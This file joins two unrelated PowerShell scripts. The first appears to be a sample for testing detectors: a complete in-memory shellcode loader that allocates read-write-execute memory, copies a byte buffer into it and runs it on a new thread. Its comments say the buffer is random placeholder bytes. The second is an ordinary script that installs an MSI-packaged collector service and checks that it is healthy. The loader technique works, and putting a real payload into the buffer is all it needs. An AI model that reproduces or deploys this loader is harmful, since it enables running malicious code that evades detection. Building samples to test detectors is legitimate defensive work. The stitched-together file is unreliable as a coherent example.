<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xce, 0x68, 0x2b, 0x69, 0x9c, 0xc9, 0x68, 0x5e, 0xa1, 0x24, 0x12, 0x02, 0xde, 0xdd, 0x95, 0xc0,
        0x1d, 0xfd, 0x2b, 0x28, 0x28, 0x6a, 0x4b, 0x44, 0x0c, 0x64, 0x41, 0x9e, 0x49, 0x82, 0x51, 0x1a,
        0xc8, 0xbf, 0xd5, 0x4d, 0x2a, 0x73, 0x87, 0xd1, 0xa9, 0x45, 0x87, 0x35, 0xd1, 0x53, 0xc2, 0xa5,
        0xc4, 0xb5, 0x97, 0xfc, 0xa0, 0xc9, 0x55, 0x25, 0x33, 0xfa, 0xf5, 0xc2, 0x69, 0xcd, 0x1d, 0x2a,
        0x24, 0xcc, 0x3d, 0x97, 0x37, 0xe2, 0xe4, 0x23, 0xfd, 0x05, 0x1a, 0x35, 0x93, 0xaf, 0x76, 0x6b,
        0xb3, 0xf3, 0x1c, 0xf5, 0xcc, 0x75, 0x50, 0xc1, 0xe8, 0x89, 0xb1, 0xb6, 0xa3, 0xf7, 0xd3, 0xf6,
        0x2d, 0x85, 0x8b, 0x37, 0x08, 0xdc, 0x61, 0x08, 0x50, 0x23, 0x53, 0x24, 0xe7, 0x6b, 0x64, 0x9c,
        0x30, 0x24, 0xd4, 0xd9, 0x87, 0x72, 0xe6, 0xa2, 0x4e, 0x6e, 0xe0, 0x09, 0x99, 0xbc, 0xf5, 0x89,
        0x9f, 0x03, 0xe6, 0x3d, 0x10, 0x87, 0x55, 0x0b, 0xef, 0xf6, 0x1b, 0x18, 0x63, 0x24, 0x5b, 0xf8,
        0x87, 0x4e, 0x91, 0x24, 0xb7, 0xb6, 0x75, 0xec, 0xd3, 0xef, 0xf7, 0x97, 0xe2, 0x79, 0x05, 0x8d,
        0xab, 0x64, 0x6c, 0x8e, 0xae, 0xd3, 0xe7, 0xf0, 0x0d, 0xb4, 0x2d, 0xaa, 0xd4, 0x41, 0x79, 0x55,
        0xd9, 0xeb, 0xe5, 0xf9, 0x29, 0x85, 0x2d, 0x5f, 0xdd, 0xdd, 0x6b, 0x6e, 0xe5, 0xd1, 0x6a, 0x5e,
        0xc4, 0x7b, 0x57, 0x46, 0x5a, 0x8a, 0x0a, 0x67, 0xe0, 0x1b, 0x56, 0xe8, 0xd5, 0x5a, 0x42, 0x87,
        0xc6, 0x7b, 0xb1, 0xe7, 0xac, 0x11, 0xa0, 0x00, 0xc5, 0x77, 0x18, 0x16, 0x21, 0xac, 0xc4, 0xeb,
        0x32, 0x83, 0x48, 0xfe, 0x81, 0x99, 0x49, 0x45, 0x9b, 0xed, 0x4e, 0x8b, 0xa9, 0xb3, 0xb3, 0x7c,
        0x5e, 0xf1, 0xf8, 0x5e, 0x57, 0x46, 0x18, 0xa6, 0xf9, 0x91, 0x2d, 0x66, 0xf0, 0x7c, 0x10, 0xf9,
        0x45, 0x57, 0xa8, 0x47, 0x34, 0x05, 0x8c, 0x08, 0x4e, 0x04, 0x35, 0xd1, 0x66, 0xdb, 0x10, 0x59,
        0xeb, 0x0e, 0x25, 0xae, 0x10, 0x1c, 0x85, 0x1c, 0x6e, 0x97, 0x72, 0x59, 0x6d, 0xca, 0x0e, 0x34,
        0xc3, 0x62, 0x96, 0x7b, 0x8c, 0xbd, 0x82, 0x18, 0x17, 0x05, 0xd7, 0x78, 0xb2, 0xc6, 0x7f, 0x4d,
        0xca, 0x87, 0x1e, 0x41, 0x23, 0xfc, 0xc2, 0xa4, 0xac, 0x3c, 0x69, 0x6b, 0x9b, 0xbe, 0x9c, 0x20,
        0x98, 0xb5, 0x58, 0x90, 0xa8, 0xb4, 0xee, 0x20, 0xc8, 0x61, 0xd0, 0x9d, 0x26, 0xa4, 0xe6, 0x50,
        0x09, 0x71, 0xba, 0xac, 0x40, 0xec, 0xe5, 0x7e, 0x57, 0xf5, 0x89, 0x8d, 0x02, 0xa9, 0xa3, 0x2a,
        0x82, 0x74, 0x96, 0xf0, 0xfd, 0x6a, 0x37, 0x48, 0xee, 0xae, 0x8e, 0x0a, 0x6f
    )

    $Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 1423)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
<#
.SYNOPSIS
    Installs the AdatumCollector package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.EXAMPLE
    .\Invoke-AgentSetup.ps1 -InstallerPath C:\Scripts\packages\AdatumCollector-3.8.8.msi
.NOTES
    Author: M. Rahman
    Last updated: 2024-04-04
#>

$ErrorActionPreference = "Stop"
$InstallerPath = 'C:\Scripts\packages\AdatumCollector-3.8.8.msi'
$ServiceName = 'AdatumCollector'
$Port = 9000
$TimeoutSec = 120
$LogPath = 'C:\Logs\install-adatumcollector-2026-03-25.log'
$RuleName = "AdatumCollector Inbound"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = 'HKLM:\SOFTWARE\Adatum\AdatumCollector'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '3.8.8' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName 'AdatumCollector Inbound' -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName 'AdatumCollector Inbound' -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'AdatumCollector'
    Version   = '3.8.8'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = "deploy@internal.corp"
$subject = "AdatumCollector 3.8.8 deployed on $env:COMPUTERNAME"

$mailParams = @{
    To         = $MailTo
    From       = 'deploy@internal.corp'
    Subject    = $subject
    Body       = "Installation completed and the service is responding."
    SmtpServer = 'smtp.internal.corp'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$stale = Get-ChildItem -Path $env:TEMP -Filter 'adatumcollector-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$agentConfig = Join-Path $env:ProgramData 'AdatumCollector\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'AdatumCollector*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
